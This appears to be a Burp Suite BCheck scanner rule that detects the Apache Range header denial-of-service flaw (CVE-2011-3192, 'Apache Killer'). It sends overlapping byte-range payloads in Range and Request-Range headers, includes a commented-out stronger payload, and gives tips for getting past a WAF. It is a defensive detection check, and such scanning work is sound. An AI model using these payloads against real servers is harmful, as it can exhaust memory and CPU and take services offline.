metadata:
    language: v2-beta
    name: "[CVE-2011-3192] Apache Range Header DoS (Apache Killer)"
    description: "Apache Range Header DoS (Apache Killer)"
    author: "Andrej Å imko @ Accenture"
    tags: "CVE-2011-3192", "Apache", "DoS", "Denial of Service"

#if you want have a better PoC, try adding 0-, e.g. uncomment the 2nd payload and comment the first one
    #the "stronger" payload is not enabled by default, as payloads are tried for every single 200 response for the unique path. Therefore it could perform unintentional Denial of Service against the server.
    #in case you use the 2nd payload it is highly recommended to test a single request at the time
define:
    DoS_payload = "bytes=0-,0-"
    #    DoS_payload = "bytes=0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-"
    response_payload = "Content-range: bytes"

given path then
    send request called check:
        method: "GET"

    if {check.response.status_code} is "200" then
        send request called DoS:
            method: "GET"
            headers:
                "Range": {DoS_payload}
            headers:
                "Request-Range": {DoS_payload}

        if {DoS.response.status_code} is "206" and
            ({response_payload} in {DoS.response.body}) then
            report issue:
                severity: high
                confidence: firm
                detail: "The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64, and 2.2.x through 2.2.19 allows remote attackers to cause a denial of service (memory and CPU consumption) via a Range header that expresses multiple overlapping ranges, exploit called \"Apache Killer\".

                    Note that it has been observed on some hosts, that PoC has been successuful for \"bytes=0-\" but not for \"bytes=0-,0-\" or more \"0-\" characters. This has most likely been an attempt for a WAF fix. However, trying the attack different on more different static files (e.g. .js, .ico, .woff2, .png, .jpg, ...) might result in a higher success rate when WAF is improperly set.

                    **If you see this issue consider disabling the BCheck so as not to perform constant DoS during scanning!**"
                remediation: "Update Apache to the latest version."
        end if
    end if
